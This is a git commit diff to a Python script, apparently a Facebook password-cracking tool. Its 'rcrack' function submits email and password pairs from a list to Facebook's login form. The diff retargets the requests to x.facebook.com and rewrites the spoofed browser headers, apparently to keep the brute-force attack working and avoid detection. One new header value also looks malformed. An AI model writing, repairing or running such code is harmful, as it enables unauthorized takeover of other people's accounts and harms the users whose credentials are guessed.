8e68e073a956f722caf1a024020735467682434f
NAYEM-404-CYBER <108661094+NAYEM-404-CYBER@users.noreply.github.com>
2024-04-10 15:45:23 +0600

    Update n-xd.py

--- n-xd.py
+++ n-xd.py
@@ -852,14 +852,14 @@ def rcrack(ids,passlist):
 			"email":ids,
 			"pass":pas,
 			"login":"Log In"}
-			header_freefb = {'authority':'mbasic.facebook.com',
+			header_freefb = {'authority':'x.facebook.com',
 			'method': 'POST',
 			'scheme': 'https',
-			'accept': 'en-US,en;q=0.8',
-			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange,v-b3;q=0.7 ',
+			'accept-encoding':'gzip, deflate, br',
 			'cache-control': 'max-age=0',
-			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
-			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"macOS"',
+			'sec-ch-ua': '" Not A.Brand"v"99", "Chromium";y="124"',
+			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
 			'sec-fetch-dest': 'document',
 			'sec-fetch-mode': 'navigate',
 			'sec-fetch-site': 'none',
@@ -1018,4 +1018,3 @@ except requests.exceptions.ConnectionError:
 	exit()
 except:exit()
   
-
